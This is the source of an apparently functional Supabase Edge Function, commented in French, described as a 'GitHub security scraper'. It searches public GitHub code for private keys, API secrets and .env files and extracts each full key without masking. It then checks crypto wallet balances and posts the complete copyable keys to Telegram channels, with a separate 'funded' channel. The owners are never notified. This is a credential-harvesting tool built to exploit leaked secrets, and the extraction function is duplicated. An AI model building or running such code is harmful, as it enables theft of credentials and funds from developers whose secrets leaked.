/**
 * Supabase Edge Function - GitHub Security Scraper Worker
 * Avec vérification de balance crypto et 2 channels Telegram
 */

import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
import { checkBalance } from './balance-checker.ts';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Telegram helper avec 2 channels
async function sendTelegramNotification(message: string, chatId: string): Promise<void> {
  const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
  const enabled = Deno.env.get('TELEGRAM_NOTIFICATIONS') === 'true';

  if (!enabled || !botToken || !chatId) {
    console.log('Telegram notifications disabled or not configured');
    return;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });

    if (response.ok) {
      console.log(`Telegram notification sent to ${chatId}`);
    }
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

// Extrait la clé complète (pas de masquage)
function extractFullKey(codeSnippet: string): string {
  const patterns = [
    /(?:PRIVATE_KEY|WALLET_KEY|SECRET_KEY)[=:\s]*["']?([a-fA-F0-9]{64}|0x[a-fA-F0-9]{64})["']?/i,
    /(0x[a-fA-F0-9]{40})/,
    /([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,87})/,
    /([1-9A-HJ-NP-Za-km-z]{43,88})/,
    /["']([a-z]+\s+){11,23}[a-z]+["']/i,
    /["']([a-zA-Z0-9+/=_-]{40,})["']/,
  ];

  for (const pattern of patterns) {
    const match = codeSnippet.match(pattern);
    if (match) {
      return match[1] || match[0];
    }
  }

  return codeSnippet.trim();
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const githubToken = Deno.env.get('GITHUB_TOKEN');
    const chatIdAll = Deno.env.get('TELEGRAM_CHAT_ID_ALL') || '-1003113285705';
    const chatIdFunded = Deno.env.get('TELEGRAM_CHAT_ID_FUNDED') || '-1002944547225';

    if (!githubToken) {
      throw new Error('GITHUB_TOKEN not configured');
    }

    console.log('🚀 Starting GitHub security scan...');

    const {data: scan, error: scanError} = await supabaseClient
      .from('github_scan_history')
      .insert({
        scan_type: 'code',
        query: 'Edge Function scan with balance check',
        status: 'running',
        started_at: new Date().toISOString(),
      })
      .select('id')
      .single();

    if (scanError) throw scanError;
    const scanId = scan.id;

    const {data: patterns, error: patternsError} = await supabaseClient
      .from('github_sensitive_patterns')
      .select('*')
      .eq('is_active', true);

    if (patternsError) throw patternsError;

    console.log(`Loaded ${patterns?.length || 0} active patterns`);

    const searchQueries = [
      'PRIVATE_KEY OR WALLET_KEY OR SECRET_KEY',
      'BINANCE_API_KEY OR STRIPE_SECRET_KEY OR AWS_SECRET_KEY',
      'filename:.env',
    ];

    let totalResults = 0;
    let findingsCount = 0;
    let fundedCount = 0;

    for (const query of searchQueries) {
      try {
        const searchUrl = `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=30`;
        const response = await fetch(searchUrl, {
          headers: {
            Authorization: `token ${githubToken}`,
            Accept: 'application/vnd.github.v3+json',
          },
        });

        if (!response.ok) continue;

        const data = await response.json();
        totalResults += data.items?.length || 0;

        for (const item of data.items || []) {
          try {
            const contentResponse = await fetch(
              `https://api.github.com/repos/${item.repository.full_name}/contents/${item.path}`,
              {
                headers: {
                  Authorization: `token ${githubToken}`,
                  Accept: 'application/vnd.github.v3.raw',
                },
              }
            );

            if (!contentResponse.ok) continue;
            const content = await contentResponse.text();

            for (const pattern of patterns || []) {
              try {
                const regex = new RegExp(pattern.pattern_regex, 'gi');
                const matches = content.match(regex);

                if (matches && matches.length > 0) {
                  const {data: existing} = await supabaseClient
                    .from('github_security_findings')
                    .select('id')
                    .eq('repository_url', item.repository.html_url)
                    .eq('file_path', item.path)
                    .limit(1);

                  if (existing && existing.length > 0) continue;

                  const {error: findingError} = await supabaseClient
                    .from('github_security_findings')
                    .insert({
                      scan_id: scanId,
                      pattern_id: pattern.id,
                      repository_url: item.repository.html_url,
                      repository_name: item.repository.full_name,
                      repository_owner: item.repository.owner.login,
                      file_path: item.path,
                      code_snippet: content.substring(0, 500),
                      matched_pattern: matches[0].substring(0, 50),
                      pattern_type: pattern.pattern_type,
                      severity: pattern.severity,
                      status: 'new',
                      metadata: {
                        match_count: matches.length,
                        file_url: item.html_url,
                      },
                    });

                  if (!findingError) {
                    findingsCount++;

                    // Extraire la clé complète
                    const fullKey = extractFullKey(content);

                    // Vérifier la balance
                    const balanceInfo = await checkBalance(pattern.pattern_type, content);

                    // Message pour channel ALL (tous les findings)
                    const messageAll = formatFindingMessage(
                      item.repository.full_name,
                      item.repository.html_url,
                      item.repository.owner.login,
                      item.path,
                      fullKey,
                      pattern.pattern_type,
                      pattern.severity,
                      balanceInfo
                    );

                    await sendTelegramNotification(messageAll, chatIdAll);

                    // Si balance > 0, envoyer aussi au channel FUNDED
                    if (balanceInfo.hasBalance) {
                      fundedCount++;
                      const messageFunded = formatFundedMessage(
                        item.repository.full_name,
                        item.repository.html_url,
                        item.repository.owner.login,
                        item.path,
                        fullKey,
                        pattern.pattern_type,
                        pattern.severity,
                        balanceInfo
                      );

                      await sendTelegramNotification(messageFunded, chatIdFunded);
                      console.log(`🚨 FUNDED finding: ${pattern.pattern_name} - ${balanceInfo.balance} ${balanceInfo.currency}`);
                    }

                    console.log(`🚨 Finding created: ${pattern.pattern_name}`);
                  }
                }
              } catch (patternError) {
                console.error(`Pattern error:`, patternError);
              }
            }
          } catch (itemError) {
            console.error(`Item error:`, itemError);
          }
        }
      } catch (queryError) {
        console.error(`Query error:`, queryError);
      }
    }

    await supabaseClient
      .from('github_scan_history')
      .update({
        status: 'completed',
        completed_at: new Date().toISOString(),
        total_results: totalResults,
        findings_count: findingsCount,
      })
      .eq('id', scanId);

    console.log(`✅ Scan completed: ${findingsCount} findings (${fundedCount} funded) from ${totalResults} results`);

    // Résumé vers channel ALL
    if (findingsCount > 0) {
      await sendTelegramNotification(
        `🔍 *Scan Terminé*\n\n📊 *Résumé*\n\`\`\`\nFindings   : ${findingsCount}\nAvec fonds : ${fundedCount}\nRésultats  : ${totalResults}\n\`\`\``,
        chatIdAll
      );
    }

    return new Response(
      JSON.stringify({
        success: true,
        scanId,
        totalResults,
        findingsCount,
        fundedCount,
        message: `Scan completed successfully`,
      }),
      {
        headers: {...corsHeaders, 'Content-Type': 'application/json'},
        status: 200,
      }
    );
  } catch (error: any) {
    console.error('Error:', error);
    return new Response(
      JSON.stringify({success: false, error: error.message}),
      {
        headers: {...corsHeaders, 'Content-Type': 'application/json'},
        status: 500,
      }
    );
  }
});

function extractFullKey(text: string): string {
  const patterns = [
    /(?:PRIVATE_KEY|WALLET_KEY|SECRET_KEY)[=:\s]*["']?([a-fA-F0-9]{64}|0x[a-fA-F0-9]{64})["']?/i,
    /(0x[a-fA-F0-9]{40})/,
    /([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,87})/,
    /([1-9A-HJ-NP-Za-km-z]{43,88})/,
    /["']([a-z]+\s+){11,23}[a-z]+["']/i,
    /["']([a-zA-Z0-9+/=_-]{40,})["']/,
  ];

  for (const pattern of patterns) {
    const match = text.match(pattern);
    if (match) return match[1] || match[0];
  }

  return text.substring(0, 200);
}

function formatFindingMessage(
  repoName: string,
  repoUrl: string,
  owner: string,
  filePath: string,
  fullKey: string,
  patternType: string,
  severity: string,
  balanceInfo: any
): string {
  let msg = `🔴 *${severity.toUpperCase()} - ${patternType}*\n\n`;
  msg += `🔍 *Repository:* [${repoName}](${repoUrl})\n`;
  msg += `📁 *File:* \`${filePath}\`\n`;
  msg += `👤 *Owner:* @${owner}\n\n`;
  msg += `🔑 *CLÉ COMPLÈTE (copiable):*\n\`\`\`\n${fullKey}\n\`\`\`\n\n`;
  
  if (balanceInfo.hasBalance) {
    msg += `💰 *BALANCE:* ${balanceInfo.balance} ${balanceInfo.currency}\n`;
    msg += `💲 *USD:* $${balanceInfo.balanceUSD?.toFixed(2) || '0.00'}\n`;
    msg += `⛓️ *Blockchain:* ${balanceInfo.blockchain}\n\n`;
  }
  
  msg += `🔗 [Voir le repo](${repoUrl})`;
  return msg;
}

function formatFundedMessage(
  repoName: string,
  repoUrl: string,
  owner: string,
  filePath: string,
  fullKey: string,
  patternType: string,
  severity: string,
  balanceInfo: any
): string {
  let msg = `🚨 *ALERTE CRITIQUE - FONDS DÉTECTÉS !* 🚨\n\n`;
  msg += `💰 *Balance:* ${balanceInfo.balance} ${balanceInfo.currency} ($${balanceInfo.balanceUSD?.toFixed(2)})\n`;
  msg += `⛓️ *Blockchain:* ${balanceInfo.blockchain}\n\n`;
  msg += `🔍 *Repository:* [${repoName}](${repoUrl})\n`;
  msg += `📁 *File:* \`${filePath}\`\n`;
  msg += `👤 *Owner:* @${owner}\n\n`;
  msg += `🔑 *CLÉ/ADRESSE COMPLÈTE:*\n\`\`\`\n${fullKey}\n\`\`\`\n\n`;
  msg += `📋 *Type:* ${patternType}\n`;
  msg += `⚠️ *Severity:* ${severity.toUpperCase()}\n\n`;
  msg += `🔗 [Voir le repo](${repoUrl})\n\n`;
  msg += `⚡ *ACTION URGENTE REQUISE !*`;
  return msg;
}